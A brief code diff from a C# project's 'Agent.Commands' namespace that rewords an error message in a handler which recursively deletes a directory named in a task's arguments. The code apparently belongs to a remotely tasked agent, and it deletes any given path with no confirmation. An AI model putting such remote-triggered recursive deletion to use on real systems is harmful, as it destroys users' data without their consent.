@@ -17,7 +17,7 @@ namespace Agent.Commands
 
             if (task.Args is null || task.Args.Length == 0)
             {
-                return "No Path Provided";
+                return "Error Provide Args <fullPathToDir>";
             }
             var path = task.Args[0];
             Directory.Delete(path,true);
